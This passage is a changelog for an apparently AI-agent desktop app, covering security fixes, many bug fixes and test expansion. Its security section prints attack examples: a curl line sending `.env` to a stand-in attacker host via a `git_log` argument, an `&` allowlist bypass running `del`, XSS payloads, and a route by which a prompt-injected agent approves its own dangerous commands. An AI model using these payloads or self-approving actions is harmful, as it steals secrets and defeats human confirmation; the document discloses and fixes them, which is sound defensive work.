"shell 命令" returns 8478 characters at 25 hits, 7696 with `budget: 12`, and 3405 with `budget: 8`
— the parameter cannot be used to shorten a reply, which is exactly how the old description ("Omit
to scan without a result cap") invited a model to use it. The description now says what it limits,
and a test fails if it drifts back.

### Security



**A prompt-injected agent could approve its own dangerous operations.** The confirmation gate returns
a ticket with a `needs_confirm` result, and that raw result was pushed into the history the model reads
next — so the model could call `shell`, read the ticket out of its own tool result, and immediately call
again with `_confirm_ticket` set. The ticket store checks the tool name, an argument fingerprint (which
deliberately ignores `_`-prefixed keys, so adding the ticket does not change it) and a TTL; nothing tied
redemption to a person. The gate only gated the honest path. The ticket is now redacted out of what the
model sees, and a `_confirm_ticket` arriving from the model is discarded — the only legitimate
redemption is the human path, which takes its arguments from the server's own record.

**Command injection through `git_log`.** `count` was declared `type: 'number'` in the schema and read as
`args.count as number` — a TypeScript cast, erased at runtime. A model sending
`count: "1 & curl -d @.env https://attacker"` produced a command string `cmd.exe` ran in full, and the
tool is not marked dangerous, so the confirmation gate did not apply either. The argument is now coerced
to an integer and clamped.

**The command allowlist was bypassable with a single `&`.** `cmd.exe` treats `&` exactly like `&&`, but
the splitter only handled `&&`, `||`, `;` and `|` — so with `SHE_ALLOWED_COMMANDS=echo`, the command
`echo hi & del victim` was inspected as one allowed segment and ran as two commands. The splitter now
scans the line properly, respecting quotes: it breaks on every separator the shell honours, and it
refuses an unterminated quote rather than guessing. Redirection is refused in allowlist mode, because a
check that only reads the program name cannot say anything about a redirect target.

**Two paths read and wrote outside the workspace.** `POST /api/kb/ingest` resolved its `path` against
the workspace root with no containment check, so any file the server process could read was ingested
into the knowledge base and became retrievable through `kb_query` — a host-file read primitive, reachable
from the agent's own `kb_ingest_scan` tool, which advertised "absolute path" in its description. And
applying a staged patch (or undoing a checkpoint) resolved its path with no check at all, while the patch
store is a plain JSON file INSIDE the workspace that the agent may write — so a forged entry made the
user's next "Apply" write outside the jail, through the reviewed-diff UI. Both now use the file tools'
containment check, shared rather than reimplemented so the two cannot drift.

**`DELETE /api/plugins?dir=.` deleted every installed plugin.** `resolveDir` stripped separators but not
`.`, and `join(root, '.')` normalises to the plugins root itself, which passed the `startsWith` guard. It
answered 200. `dir=..` reached the parent directory, and `writeSource` had no containment check, so
`PUT /api/plugins/source?dir=..` wrote `index.mjs` and `manifest.json` into `~/.she-app/`. Plugin names
are now validated as plain directory names and containment is verified rather than assumed.

**Four skills routes tested containment with `startsWith`.** `<ws>/.she/skills-backup/x.md` starts with
`<ws>/.she/skills`, so a sibling directory whose name merely begins with the intended one was readable —
and in one route deletable. Replaced with a relative-segment check that a shared prefix cannot fool.

**MCP server `env` values were returned by `GET /api/mcp/servers`.** Those variables routinely hold
tokens, and the panel handed them back verbatim. The keys are still listed so the user can see how a
server is configured; the values are now masked.


**DNS-rebinding protection now coexists with deployment.** The guard accepted only
`127.0.0.1`, `localhost` and `[::1]`, which made container and LAN access impossible.
Literal IP addresses are now always accepted (rebinding requires a hostname) and other
hostnames need explicit opt-in via `SHE_ALLOWED_HOSTS`. Origin is validated the same
way. Verified by `scripts/host-guard-check.mjs` against a real server.

**Automation mode no longer widens permissions.** It used to force
`allowAllCommands = true` and `denyDestructiveByDefault = false`, so a fresh clone ran
with no destructive-command guard. Automation is a conversational stance; permissions
now come only from their own settings, with safe defaults.

### Fixed


**A running turn's transcript could be replaced from disk, so the reply — chain of thought included —
only appeared once it had finished.** The live reply is tracked by its *position* in `messages`, and
`App` re-binds history on every `activeSessionId` change. The first message of a fresh session is
exactly such a change (the server creates the session and the window adopts its id), so
`loadHistory` landed in the middle of the turn and replaced the transcript with a disk copy that
cannot contain the turn still being generated — a turn is persisted only when it ends. After that
swap the tracked index pointed at a message that was no longer ours, so every later chunk was
dropped and nothing rendered until the turn was written to disk and read back. That is the reported
symptom exactly: the chain appears only after generation. Three things changed. `loadHistory` now
defers to a live turn of the same session (a real switch still loads — switching detaches the stream
first, and that is what leaves `abortRef` null). The live patch re-opens its bubble from the
accumulators when the tracked one is gone, so the stream outranks a stale disk copy instead of
vanishing into it. And the follow poll — whose own comment already said a local stream must not be
overwritten — now re-checks that on **every tick** rather than only when it was armed; it was
pulling history every 2s into the window that was actively streaming. Separately, a
`tool_call_start` frame with no `toolCall` was pushed into the transcript as `undefined` and
crashed the whole view on `tc.id`, blanking the rest of the session; such a frame is ignored now.

Verified against the real thing, not only in tests: the server streams `reasoning` incrementally on
a plain turn and across a tool loop (measured frame arrival: 137 frames spread over 545ms, then 34
over 201ms — not one burst at the end), and the real app in a browser grew the chain from 243 to
1033 characters over ~1.2s with the header reading 思考中… throughout. The failure was never in the
stream; it was in what the view did with a transcript that got swapped underneath it.

**A constraint's exception was read as its prohibition, so the permitted call was reported as a
violation.** A constraint is one sentence, and the half that says what is *allowed* was parsed as if
it said what is forbidden. The constraint recorded in a live run — "子代理不得用 `shell`、`fs_*`、`git`
等工具，不得修改工作区；唯一被点名的写入是 `kb_upsert` 写知识库（用户明确指定的例外）" — came back as a
violation of `kb_upsert`, reported against the agent's own `kb_upsert` call: the call the constraint
had just carved out. It was a major signal (weight 0.8), so it drove the turn to `drift` and was
written into the error book as a lesson, where it would be read back before similar work. The
failure mode is self-inflicted in the worst direction — the more carefully a constraint names its
exception, the more reliably the check fires on the permitted action. Objects are now read from the
prohibition clauses only (`prohibitionScope`): sentence punctuation splits clauses, a clause that
grants an exception is dropped, and a comma alone does not split — "不得改动 a.ts、b.ts" is one
prohibition listing two objects — so lists stay whole while "…，唯一允许的是 X" stays out of the
forbidden set. A true violation still fires: `不要改 cluster.ts，唯一允许的是只读查询——但不要动
migrations` still catches a write into `migrations/`. `pnpm check:reflection` covers both halves.

**A message addressed to a session id that did not exist overwrote the conversation on disk.**
`persistHistory` had no branch for an id the session store did not know, so it fell through to
`sessions.syncActive` — which adopts whatever it is handed as the active session and writes into
it. Measured on the live server: `POST /api/chat {"session_id":"sess_harvest_probe"}`, a probe
against the running app, replaced the user's 786KB conversation with the probe's own transcript and
left 290KB behind. The damage is invisible in the worst way: the surviving file is a valid, shorter
conversation, so it reads as "the agent forgot" rather than as corruption, and the bytes are gone.
The fallback was the whole cause — a writer with no home should get one, not take someone else's —
so an addressed-but-unknown id now goes through `SessionStore.ensure(id)`, which creates that
session if it is new and never touches `active_id`. `pnpm check:data` drives the HTTP endpoint with
an unknown id and asserts the conversation being read — and every other session — is unchanged, and
the guard was verified by mutation: restoring `syncActive` makes the new section fail.

**A scheduled run replaced the user's conversation on the next restart.** A run created its own
session — named after the task, with no parent — and `SessionStore.create` handed `active_id` to
whatever session it had just made. That guard existed for subagents (`parentId`) but a task passes
neither, so every fire moved the user onto the job's session. The damage showed up a boot later:
the run leaves messages in that session, `pickStartupSession` prefers the most recently updated
session that has any, and the conversation the user was reading was replaced by a job log. A
scheduled session is now created with `background: true`, which both keeps it from taking
`active_id` and puts it second in the startup pick. The rule itself moved out of the server entry
into `chooseStartupSession`, where it can be tested directly — inline, the only symptom was an
intermittent end-to-end failure that depended on whether the scheduler happened to fire inside the
check's window.

**The trace panel reopened itself.** Every knowledge-base result ran `setShowTrace(true)`, so closing
the panel was futile: the next query — which the agent issues on its own — slid it back open. A panel
the user explicitly closed must stay closed. The reopen handle now carries a dot when new trace data
arrived while it was closed, so nothing is missed silently.

**The skill-profile switch showed a profile the agent was not using.** The composer read
`localStorage` and never asked the server, so with `SHE_SKILL_PROFILE=general` the settings panel
(which reads the server) showed 通用 while the composer highlighted 开发. The server is the source of
truth for which profile is *active*, and the client now reads it on boot.

**The knowledge base looked empty after an import.** The import refreshed the chat history but not the
knowledge tree, so the sidebar kept showing "no groups yet" while the library held thousands — until
the workspace was re-entered or the page reloaded. `onImported` now refreshes sessions, the tree and
the stats.

**The shared / merged knowledge base was unreachable in practice.** The controls existed only inside
Settings, about 950px down a ~2900px scrolling form, so a user looking for "merge two libraries" in
the knowledge-base area — the obvious place — found nothing. The knowledge-base section header now has
an action that opens Settings at that block.

**The import dialog asked for a decision twice.** A second, louder "import everything" button sat
beside the deliberate one, which made selecting first look like the slow path, and bulk-importing
every conversation on the machine is not a thing to make the easiest click on the screen. "Select all"
in the toolbar already covers that case in one extra step and shows what is about to be imported.

**A bulk import could reorder itself.** When no source timestamps were present, every item defaulted
to "now" — computed per item — so sorting by that field reordered the batch according to accidental
sub-millisecond differences. Sorting now applies only when the items carry real dates, which is what
it was for.



**Request bodies had no size limit.** `parseBody` accumulated every chunk, and Node imposes no ceiling,
so `POST /api/chat` with a multi-gigabyte body killed the process with a V8 heap OOM — which the
`uncaughtException` handler cannot catch. Capped at 32MB, with the raw-upload path keeping its own limit.

**Language servers were never stopped.** `Agent.dispose()` and `LspServer.stop()` existed and nothing in
the repository called either, so a session that had ever used an `lsp_*` tool left a language server
(`tsserver` indexes the whole project) running for the life of the process — once per rebuild, and the
agent set is rebuilt on every plugin change and settings save. Disposal is now wired into agent
replacement, session drop, and shutdown.

**Stopping during a patch application did nothing.** `isRunning()` read `aborter`, which only `chat()`
set, so `GET /api/chat/running` said idle while a confirm or patch-apply turn held the conversation:
the UI showed Send instead of Stop, `POST /api/chat/stop` returned `stopped: false`, and a second message
was accepted and came back as an SSE error rather than the documented 409. The abort controller is now
owned by the turn itself, so every entry point is interruptible.

**A refused patch application had already written the file.** `applyPatch` took the patch from the
store, pushed a checkpoint and wrote the file BEFORE entering the exclusive section, which then threw
`TurnInProgressError`. The user saw a 409 while the edit had landed and the patch was gone, so it could
be neither retried nor rejected.

**A stream error after a tool call was silently dropped.** Both error handlers only wrote the message
when the last message was an assistant bubble — and a tool-loop turn ends on a `role: 'tool'` row. A
failure on the round after a tool call produced no message at all, and the pending tool card sat at
`result === undefined`, rendering as an endless "执行中" animation. Errors are now always surfaced.

**The staged-write preview was a DOM XSS.** It rendered `highlight(...).html || clipCode(content)` as
`innerHTML`, so for a file with no registered grammar (`.txt`, `.log`, `.env`, a dotfile) the RAW content
became HTML, and `<img src=x onerror=...>` in any such file executed in the app origin — which holds the
API, the file tools and the stored keys. Content is model-controlled, so a prompt injection in any file
the agent read could reach it. Ungrammared content is now a React text node, and `check:uistruct` asserts
that every injection site has that branch.

**`Escape` closed a dialog and a panel at once.** `useEscapeToClose` listens on `document` and calls
`preventDefault()`; App's handler listens on `window` and never checked `defaultPrevented`, so both ran
— closing, say, the skill manager and then falling through to collapse the 组结构共振轨迹 panel. Three
panels were also missing from the chain entirely.

**Switching sessions mid-turn bled one conversation into another.** The stream handlers close over the
hook's `setMessages` and the hook survives a session switch, so a running turn kept appending tool
results and streamed text into whatever transcript was on screen — including overwriting a message in the
new conversation, since the live bubble is tracked by index. The client now detaches (without stopping
the turn server-side, so it finishes and persists into its own history). The same fix applies to work
groups, where a running wave kept appending members' messages to the next group's transcript, and to
`load()`, which had no ordering guard.

**`loadHistory()` was called with the previous session's id.** It reads `sidRef`, which is assigned
during render, so immediately after `setActiveSessionId` it still held the old conversation; the
`[activeSessionId]` effect then fetched the right one and the two responses raced, so a slow first
response could overwrite the new transcript with the old chat under the right title.

**Layout state was shared between windows.** Pane widths, focus mode and the collapsed sidebar lived in
`localStorage`, so a newly opened or reloaded window silently inherited the other window's layout (it
could come up in focus mode with the sidebar hidden) and both windows overwrote the same keys. They are
per-window now (`sessionStorage`), with a fallback read of the old keys so an existing user keeps the
layout they had.

**The 备忘录 panel could not be opened.** `StatusBar` supports `onOpenMemo` and renders the button
conditionally; App never passed it, so the fully implemented panel was unreachable.

**Markdown links were not validated.** `[click](javascript:alert(...))` in model output became a real
`href`; React 18 warns about `javascript:` URLs but still renders them. Only http(s)/mailto/relative
targets are links now — the text stays visible, it just is not clickable.

**Smaller correctness fixes.** `GET /%` returned 500 instead of falling back to `index.html`
(`decodeURIComponent` throws on a malformed escape, reported as a server bug). `POST /api/chat/rewind`
was registered twice, so only the first handler ever ran and the second's validation and response shape
were dead code. `/api/schedule/:id/run` answered `{ok: true, started: true}` when the scheduler was
disabled and nothing ran. `errors.requestFailures` and `errors.crashes` were permanently 0 — the
counters existed and nothing ever incremented them, so a crashed process reported a clean one.
`/api/kb/ingest` reported cumulative library totals as if they were what the call had just added.
The status bar's memo button was unreachable, and mention autocomplete had an unsequenced fetch (a slow
response for `@a` could overwrite the hits for `@abc`) plus a debounce timer that was never cleared on
unmount.

**A failed stylesheet save reported the wrong cause, or none at all.** `saveTheme` used
`copyFileSync` for its backup, and on Windows that carries the source's attributes with it — so
a read-only `theme.css` made its own `.prev` copy read-only, and "restore the previous version",
the action a user reaches for precisely when something is wrong, then died with a bare
`EPERM: operation not permitted`. A write failure also fell through to the generic handler as
`{"error":"Internal Server Error"}`, which says nothing about which file is involved or that the
problem is permissions rather than syntax; and the editor turned that into "fix the errors
first", actively misleading when there is nothing to fix. Writes now fail with the path, the
cause and the remedy, and the editor shows the server's message verbatim.

**The stylesheet is now checked against the situations a file can be in.** Beyond the syntax
rules, `check:theme` covers a read-only file, a directory in the file's place, non-UTF-8 bytes
from a GBK editor, a leading BOM, CRLF, a symlink (how a dotfiles manager wires it up), an
empty-but-whitespace file, eight concurrent saves, a 200 KB stylesheet (validated in ~30 ms,
since the editor re-checks on every keystroke), and a workspace switch — the last because the
wallpaper once silently changed when the workspace did, and a stylesheet stored the same way
would silently restyle the whole app on every switch.

**An XSS-shaped stylesheet was verified inert, and the invariant pinned.** Saving
`</style><script>window.__pwned = 1</script>` was checked in a real browser: the script never
ran, the injected element stayed a `<style>` with zero child elements, and the legitimate CSS in
the same file still applied. The property that makes this true is `textContent` rather than
`innerHTML`, which no test would have noticed being swapped — so `check:uistruct` asserts it.

**Four checks could not fail for what they claimed.** `check:docs` reported PASS while four stale
counts and a deleted script reference sat in the docs it was supposed to police: its file-existence
test skipped any missing path whose parent directory existed (which is all of them), and its count test
only asserted that the documents agreed *with each other* — so `999 / 999` everywhere would have
passed. `check:data` had two assertions whose entire condition was `healthy` ("the server booted"), and
one of them looked for a `.bak-` suffix the code has never written (it writes `.unusable-`).
`check:subagent`'s recursion assertion built a child with no runner, so `task_spawn` could not have been
present regardless of the filter it claimed to test. `check:lsp` exited 0 when no language server was
installed — indistinguishable, in a green gate, from 18 assertions having run.

All four now assert the property they name. `check:docs` runs the unit suites and compares the quoted
total to what the runners report; `check:data` checks that the quarantine file exists under the name the
code actually uses and holds the original bytes; `check:lsp` fails when it cannot run; and a check script
nobody documented is a failure rather than a printed note. Negative-tested by reintroducing each defect.

**A window's conversation could be replaced underneath it.** The server keeps one global active
session, and every request carries an explicit `session_id` — so that value is only a hint. The
UI treated it as an instruction and re-adopted it on every session-list refresh, which happens
on **both edges of every turn**. A second window selecting its own chat, or a scheduled task
running headlessly and activating the session it works in, would therefore pull an open window
onto a different conversation mid-sentence, with no error. Selecting a conversation is now the
window's own decision, taken through one tested function (`lib/sessionChoice.ts`); the server's
value is used only as a starting point for a window that has not chosen. The choice is also
persisted per window (`sessionStorage`, not `localStorage`), so reloading a second window no
longer inherits the first window's conversation, and a stored id is validated against the list
so a conversation deleted elsewhere cannot leave a permanently empty chat. Entering a workspace
resets the selection, since a saved id belongs to the workspace being left.

**146 MB of dead wallpaper inside a project directory.** The wallpaper moved to the app
directory (it is a user preference, like the theme) but nothing removed what the old
per-workspace version had already written. On this machine that was a 146 MB video sitting in
`<workspace>/.she/background/`, read by nobody. It cannot just be deleted on sight — a user may
have put a file there deliberately — so the boot-time migration removes it only when an
app-global copy of the **same file with the same size** exists, which makes it a duplicate rather
than data. Non-duplicates, and files that exist only in the workspace, are left alone; the
outcome is logged either way. `check:restart` asserts both the removal and the two
must-not-delete cases.

**Turning off "allow all commands" turned it back on.** The Settings UI links the two toggles as
a convenience — enabling automation mode pre-ticks "allow all commands" — but they are separate
switches, and the server only honoured an explicit `allowAllCommands` in one direction. Sending
`{ automationMode: true, allowAllCommands: false }` applied `false` and then silently overwrote
it with `true`, and persisted that: the user switched the dangerous option **off** and the server
switched it back **on**. The explicit value now wins in both directions. Found by a new check that
restarts a real server; no unit test asked what happens when the two fields disagree.

**Adding a work-group role failed with an opaque 500 when the model was unreachable.** Every role
gets an AI-written skill when none is supplied, and that call needs the model — so an offline or
misconfigured install could not add a role at all, receiving `{"error":"Internal Server Error"}`
with no reason and no role. A skill is a convenience, not a prerequisite: generation failure now
leaves the skill empty (the user can write it) and is logged, so the operation succeeds.
`POST /api/cluster/generate-skill`, where generation *is* the job, now returns **502** with the
underlying cause instead of a bare 500.

**`crash.log` contained no crashes.** The launcher redirected the server's whole stderr stream
to `.she/crash.log` — the same path the server's crash handler appends real reports to. The file
on this machine held 62 lines, 60 of them routine warnings ("Refused request: …", "session not
found") and **zero** crash reports. A user opening it would reasonably conclude the app crashes
constantly, and the one time it does crash the report is buried in noise. stderr now goes to
`.she/server-err.log`, and `crash.log` is written only by the crash handler.

**Logs grew without bound.** Four append-only logs — the launcher's two, the desktop shell's
three, and the server's crash log — had nothing rotating them; `launcher-server.log` had reached
7 MB. This is the shape of bug that surfaces much later as "why is my disk filling up" rather
than as an error. All of them are now capped, keeping the newest part (the recent lines are what
explain a failure), with the cut advanced to a line boundary so a multi-byte character is never
split. A crash *loop* is the worst case, so `crash.log` is capped too.

**The startup-timeout message pointed at the wrong file.** It told the user to look at
`.she/crash.log` for an API that failed to start, but a startup failure never appears there —
the relevant logs are `desktop-server.log` and `desktop-server.err.log`.

**A one-line edit silently disabled the whole feature, and no test noticed.** A bulk replace
inserted a literal `\n` instead of a newline, merging two comment lines into one — and the
merged line began with `//`, so the statement below it was swallowed into the comment. The
stylesheet element was still created, never given any CSS, and the injected sheet was always
empty: saving a theme appeared to work and did nothing.

Every test passed, and the reason is worth stating plainly: **all of them read source, and the
browser runs a bundle.** `check:dist` now asserts that the built bundle actually contains the
load-bearing wiring (the element id, the selector promotion, both escape hatches) and that it
is not older than the newest source file. Negative-tested by reintroducing the exact break.

**`:root` variables were ignored in the light theme.** The app declares its dark tokens in
`:root` (specificity 0,1,0) and its light tokens in `[data-theme="light"]` (0,1,1), so a user
writing the documented `:root { --accent: … }` won in dark mode and silently lost in light —
the worst shape for this bug, because it reads as "the feature is broken" and gives no clue
that a selector is merely out-specified. The injected sheet now promotes `:root` and `html`
to also match `html[data-theme]`, which ties the app's themed blocks and wins on source order.
Applied at injection time, so the file on disk stays exactly what the user wrote.
Found by driving a real browser in both themes; the unit tests only ever exercised one.

**A saved stylesheet applied only while the editor was open.** The hook that injects the
stylesheet into the document was called from inside the editor panel, so a theme survived a
page load but not a restart — and `?theme=off` became a silent no-op on a normal load,
because nothing had been applied to escape from. Found by driving a real browser: the unit
tests covered the validator and the endpoints, and none of them looked at whether the saved
CSS reached the document. The hook now runs at the app root, and the preview panel takes the
state as a prop.

**Overlay panels were mounted in one render branch only.** `App` returns early for the Home
page, so a panel declared after that point cannot be opened from it. The landing page's
Settings and skill buttons were dead, and later the schedule panel and the stylesheet editor
could be reached from only one of the two screens. The overlays are now one fragment included
in both returns, so a new panel cannot land in a single branch by accident — and
`check:uistruct` derives the set of panels Home can open and fails if any of them is not
shared.

**Two check scripts could probe the developer's own server.** `security-check` and
`theme-check` passed `SHE_PORT` only through the `.env` file they wrote, but ambient
environment variables beat `.env` — so a developer who had exported `SHE_PORT` would have
their running dev server probed instead of the code under test, with a confusing
`EADDRINUSE` when the port was busy. Both now pin the settings they depend on in the child
environment.

**The localisation ratchet under-counted translated strings.** A `t(...)` call formatted
across several lines — the normal shape for one that takes placeholder values — was not
recognised as translated, so every line after the first was reported as hardcoded. The check
now finds the whole call, tracking nesting and strings, and blanks it out while preserving
newlines so reported line numbers still match the file. Without this, converting a component
did not lower the count, which would have made the ratchet meaningless.

**Data loss on a corrupt state file.** Both the session list and the work-group list
treated any parse failure as "no data" and then saved that empty state over it. A
truncated write, a hand-edit, or a version mismatch destroyed every conversation with
no copy left behind. Unusable files are now moved aside and reported, with the reason
and the backup path. The task scheduler behaves the same way.

**Cross-directory overwrite.** `hasAnySessions` returned `false` for a file that
existed but could not be parsed, so legacy recovery — whose stated rule was "only fill
a gap" — replaced the user's own session file with conversations from a different
directory. Only a genuinely absent file is treated as a gap now.

**First LSP answer was wrong.** A cold language server resolves "go to definition" on
an imported symbol to the *import line*, stably, for about three seconds. The first
answer is now awaited properly rather than returned early.

**Stale diagnostics after an edit.** Diagnostics were cached per file, so a second
check after a fix reported errors that no longer existed. Results are now cached
against the file content they describe.

**`SHE_KB_PATH` default pointed at the author's machine.** A new install defaulted its
knowledge base to `D:/AGI/she-kb/kb.sqlite`, which does not exist on anyone else's
computer. The default is now derived from the workspace.

**Version drift.** The version was hardcoded in three places, so bumping
`package.json` left `/api/health` reporting a stale number. It is read from the
manifest.

**The config parser silently dropped anything it did not understand.** It was
hand-rolled, walked lines with `/^([\w.]+)\s*:\s*(.*)/`, and did `if (!match) continue`.
It could not express a **list** at all, so a `models:` registry would be written by a
user, ignored without a word, and the default used instead — and a structural typo
produced no feedback whatsoever. Replaced with a real YAML parser; a malformed file now
fails startup with the filename and line number, and unrecognised top-level keys are
reported because a setting that looks applied but is not is worse than one that fails.

**A dropped response stream discarded everything already received.** The user had
watched text stream in, and it vanished — while those tokens had already been billed.
Partial content is now kept, the turn says it was interrupted, and the user can say
"continue". Two cases are handled separately because they need different treatment:
a break **before** any content is retried (nothing was shown, nothing lost), while a
break **after** content is kept and NOT retried (retrying would show two different
partial answers to one turn and bill for both).

**Quoted arguments were corrupted on Windows, silently.** `spawn('cmd.exe', ['/c', cmd])`
let cmd.exe re-parse the command line, so quotes did not survive. Measured:

    node -e "console.log(1)"      → (no output, exit 0)
    node -p "1+1"                 → 1+1            (should be 2)
    node -e "console.log('a b')"  → SyntaxError

The exit-code-0 cases are the dangerous ones: every command with a quoted argument —
`git commit -m "..."`, `grep "pattern" file`, most one-liners — did something other than
what was asked and reported success. Nothing in the transcript looks wrong. Fixed by
using `shell: true`, which makes Node emit the platform-correct command line.

**A command path containing spaces was misparsed into the allowlist check.**
`"C:\Program Files\nodejs\node.exe" x.js` yielded `program`, because the token was split
on whitespace before quotes were stripped.

**An incomplete tool call could be executed.** Its arguments are JSON assembled from
deltas, so a truncated call is malformed; running it would act on wrong arguments —
writing the wrong file, running the wrong command. They are now discarded and reported.

**A stream that ended without a finish marker was treated as complete.** Destroying the
socket does not always surface as an exception: the body can simply END, which looks
identical to a normal completion. That is how a truncated answer got presented as if it
were finished. The end marker (`[DONE]` or `finish_reason`) is now required.

**An endpoint that ignores `stream: true` produced an empty reply, silently.** Feeding
a JSON body to the SSE reader yielded an assistant message with no content — the turn
looked successful. It is now detected by content type and parsed normally, with a note
that the endpoint ignored the request.

**A stuck loop gave up without trying anything else.** Detection stopped the run and
asked the user, which throws away a task that was one correction from working. The
model is now told once what is repeating and asked for a different approach.

**The loop-recovery prompt leaked into the transcript.** It was pushed onto `history`,
which is persisted and rendered — and as a `user` message, so the user would see a line
they never wrote. It now goes into the request only.

**`SHE_ALLOWED_HOSTS` had to include the port.** An operator naturally writes
`she.example.com`; a browser sends `she.example.com:4577`. Comparing the exact strings
made a correct entry silently do nothing.

**Route shadowing.** `PUT /api/schedule/window` was declared after
`PUT /api/schedule/:id`, and routes match in order — so setting the working window was
read as updating a task whose id was "window".

**Topics that named themselves.** `SessionStore.update` re-derived the title from the first user
message on every messages-only write, and those writes are constant: `persistHistory` runs on each
turn's stream tick, on session activate, and when settings change. So any title that did not come
from the session's own first message was overwritten by the next write. A delegated child, which the
parent names, came back as the first line of its handoff brief — `## 交接单 - 交付物：…` — because
that brief *is* the child's first user message and the child's own titled write happens before the
next persist. A rename by the user survived only until the next message in that conversation. Both
were invisible in normal use: for an ordinary chat the derived title already equals the stored one,
so the corruption only showed on sessions named by something other than their own first message. A
title is now derived only while the session is still unnamed; the end-to-end check that was supposed
to cover the child case had been asserting immediately after the spawn, before any later persist.

**A read-only subtask filled the PARENT's error book.** The `kbReadOnly` guard covered the tools —
`kb_upsert` and `kb_link` refused — but the error book and the end-of-turn self-review write straight
through the KB engine, so they went around the refusal. Measured on a live run: a delegated child
(`sess_8d64da11747c`) filed three permanent entries into the parent's `kb.sqlite` — `plan_list ·
unavailable` and `preflight_record · unavailable`, which it called because the prompt listed them
even though its tool set did not contain them, and `目标漂移 · reflection`, which it derived by
weighing five file reads against the parent's goal. The child's system prompt is now built against
its own tool set (denied tools, their sections, and the same names inside project skill recipes are
all stripped, so the prompt and the tool table cannot disagree again), `PreflightStore` gained
`latestForSession` so a conversation is only ever measured against its own goal, and an agent whose
KB belongs to someone else writes to the book not at all — it still reports what it found, it just
does not leave a record in a memory it is borrowing.

**`kb_query` answering "no results" twice was recorded as a tool that failed twice.** An empty result
is a successful query whose answer is "nothing" — the classifier says so, the error book's own
`isWorthRemembering` already excluded it, and the prompt tells the agent to re-ask with different
words when it happens. The repeated-failure rule in `deriveReflections` read `ok === false` directly
instead of asking that predicate, so diligent searching produced a durable lesson named
`重复失败:kb_query` about a tool that had not failed once. Both rules now share one predicate, and an
unrecognised failure kind is now kept rather than dropped — the kind arrives as a string from a run
trace that outlived the version which wrote it.

**A constraint was reported as violated by four calls that only wrote about it.** The constraint
check read the whole argument blob as one string, so any call whose payload mentioned the excluded
token looked like touching it, and the payload almost always does — the agent's job is to write down
what it knows. A live run produced four false accusations from one constraint (`shell 为 Windows cmd：
无 cat/which`), from `preflight_record` (which had just declared it), `task_spawn` (which quoted it to
a child), `plan_update` (a note discussing it) and an innocent `fs_write` whose *path* was not it. The
check now reads the TARGET of a call — `path`, `command`, `scope` — and never prose: `content`,
`note`, `goal`, `prompt` and the other payload fields are stripped (recursively, so a nested handoff
cannot smuggle them back). Writing a sentence that names a file neither reads nor edits it.

**Deleting a memory left the graph pointing at it.** `KBStore.deleteMemory` removed the row and
nothing else, so two kinds of leftover survived it, neither repaired by anything downstream. Edges
kept a `source_id` / `target_id` for a node that no longer existed — the dangerous half, because
resonance traversal follows an edge and then looks up its far end, and deleting an error-book entry
is exactly when `co_occurrence` edges are left behind. And the entry's group still listed the id in
`memory_ids`, so every count read from the group disagreed with the table. Found by deleting four
rows out of a live database and then asking the file what it thought it had: five edges pointing at
four memories that were gone, and the group they had been filed under still naming all four. Deleting
one node now means one node.

**A checked-off memo entry stopped existing for whoever was not looking at it.** The scratchpad is
the one place both parties write, and both sides treated "done" as "gone": the panel hid completed
entries behind a toggle that defaulted to off, and `memo_list` filtered them the same way. Measured on
a live run, the agent had written notes, ticked them, and then asked `memo_list` a question — and the
tool answered `备忘录为空。`. That is a false statement about the world, in the one voice the model
trusts, and it has two costs: the agent re-notes what it already noted, or reports to the user that
nothing was ever recorded. The panel had the matching failure — with every entry done, the filtered
list is empty and it printed 还没有记录, which is exactly the sentence that makes a user conclude the
agent never wrote anything. Completed entries are now shown by default (the toggle still folds them
away), the count is still reported when they are folded, and both the panel and the tool distinguish
"nothing to show" from "nothing here": `memo_list` says how many entries it is withholding and how to
see them, and `includeDone: true` returns them verbatim.

**A file starting with a UTF-8 BOM made the reading tools report the wrong column, and `grep` look
past the first line.** PowerShell's `Set-Content`/`Out-File` write a BOM on Windows, so any file the
agent creates through the shell — or that a user last saved in Notepad — can begin with U+FEFF. Node's
`utf8` decoder does not remove it, which makes it an invisible character that is nonetheless real:
`grep` with a `^`-anchored pattern missed the first line of a file the pattern plainly matched, and
`fs_read` handed the model that character as content, so any column the model counted on line 1 was
one past what the language server reports for the same file (LSP positions come from the parsed
document, which has no BOM). One character of drift, silently, on every first-line diagnostic. The
live workspace this was found in had a BOM on `src/main.ts`, `tsconfig.json`, `README.md` and both
`logs/*.log`. Every other reader in the codebase already stripped it — `plan-tools`, `preflight`,
`audit`, `run-trace`, `plugins`, `ingest-tools`, `checkpoints`, `memo-tools` — and the tools an agent
actually inspects source with were the ones that did not. Only the leading character is dropped, so a
U+FEFF used as a zero-width space mid-file stays; `fs_write` strips it too, so re-writing a BOM file
unchanged is reported as unchanged instead of as a one-line edit.

### Testing



Test count went from ~40 to **631**, plus twenty check scripts wired into `check:all`
(security, data safety, subagents, LSP, host guard, accessibility, portability, metrics,
scheduling, i18n coverage, control styling, Docker structure, custom stylesheets, UI structure,
built-bundle wiring, log rotation, a real restart cycle, encoding round-trips, injection
regressions) and three evaluators (retrieval, agent end-to-end, self-verification). `check:all` runs
the build, the tests, the evaluators and every check script on a fresh clone — and `check:docs`
re-runs the unit suites to verify the count quoted here is the real one.

The two LLM-backed evaluators grade on a **rate with a floor**, not on a perfect score:
they measure agent behaviour, which varies between runs, and a gate that goes red at
random is one people learn to ignore. A real regression still drops the rate.

Several checks were themselves verified by deliberately introducing the failure they
exist to catch — which found two bugs in the checks: the accessibility icon-button rule
missed single-line JSX, and the dead-CSS rule counted classes that are assembled at
runtime (`styles['step_' + status]`).

Three harness bugs were found and pinned by their own assertions: the UI `fetch` stub
was installed once at module load while the runner was configured with `restoreMocks`,
so component tests were issuing **real** HTTP requests; teardown ordering let deferred
rejections set state after unmount, producing `act` warnings that looked like product
bugs; and the host-guard check used `fetch`, which silently ignores a `Host` header —
so it passed no matter what the guard did.

The i18n check is a ratchet: it fails when the count of hardcoded Chinese strings
rises. It caught four strings added during this work (two `aria-label`s), which is the
behaviour that keeps the localised surface from shrinking by accident.

### Known limitations



- **macOS and Linux are not verified by running them.** A portability check audits for
  platform-specific mistakes, but no CI has executed on those platforms.
- **The container image has not been built.** No Docker in the development
  environment; only its structure is checked.
- **No embedding baseline in the retrieval eval.** The configured provider (DeepSeek)
  has no `/embeddings` endpoint, so the comparison is structural-vs-BM25. The report
  states this rather than omitting the column.
- **UI localization is partial.** 652 user-facing Chinese strings remain hardcoded;
  the infrastructure and a coverage ratchet are in place.
- **No metrics export to an external system.** `/api/metrics` is pull-only JSON.
